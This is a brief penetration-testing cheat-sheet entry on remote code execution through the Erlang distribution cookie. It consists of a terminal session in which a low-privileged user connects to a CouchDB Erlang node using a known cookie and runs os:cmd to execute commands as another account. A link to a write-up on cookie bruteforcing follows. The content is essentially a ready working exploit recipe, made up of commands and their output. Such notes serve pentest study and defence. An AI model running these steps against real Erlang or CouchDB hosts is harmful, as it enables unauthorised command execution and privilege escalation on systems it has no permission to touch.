# Erlang

## Authentication Cookie RCE

```
otheruser@booj:/$ export HOME=/tmp
export HOME=/tmp
otheruser@booj:/$ erl -sname booj -setcookie cookieval -remsh couchdb@localhost
<me booj -setcookie cookieval -remsh couchdb@localhost
Eshell V7.3 (abort with ^G)
(booj@booj)1> net_adm:ping(couchdb@localhost).
net_adm:ping(couchdb@localhost).
pong
(booj@booj)2> spawn(couchdb@localhost, fun() -> io:format("~p~n", [os:cmd('/usr/bin/id')]) end).
spawn(couchdb@localhost, fun() -> io:format("~p~n", [os:cmd('/usr/bin/id')]) end).
"uid=1000(mainuser) gid=1000(mainuser) groups=1000(mainuser)\n"
<6881.23434.8>
```

[https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/](https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/)

